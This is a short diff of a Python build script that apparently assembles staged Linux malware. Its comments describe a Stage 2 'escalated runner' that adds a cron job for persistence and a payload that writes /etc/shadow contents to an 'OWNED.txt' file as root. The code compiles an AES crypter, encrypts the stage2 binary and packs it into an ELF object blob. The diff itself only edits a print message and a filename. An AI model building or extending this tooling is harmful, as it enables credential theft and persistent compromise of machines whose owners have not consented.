@@ -50,7 +50,7 @@ with open("Stage1.c", "r") as s1_source:
 # Stage 2 - Escalated runner, this reads the key from host, and then writes it somewhere and adds cron job
 # Persistence Payload (this one writes the "OWNED.txt" to the user's desktop as root w/ /etc/shadow contents)
 
-print("Writing out updated file!")
+print("Writing out updated Stage1 file!")
 
 with open("Stage1_processed.c", "w") as processed_file:
 
@@ -75,7 +75,7 @@ os.system("gcc -s aes.c Crypter.c -o crypter")
 os.system("./crypter stage2 {}".format(os.path.getsize("stage2")))
 
 # Save stage2 as blob
-os.system("objcopy -I binary -O elf64-x86-64 stage2 stage2.o")
+os.system("objcopy -I binary -O elf64-x86-64 stage2_comp stage2.o")
 # Build persistence, strip, minify, etc and converto blob, encrypt blob with known key (first line of shadow)
 # Build stage 2, link with blob, strip, minify, etc
 # Stage 1 - pack nested payloads
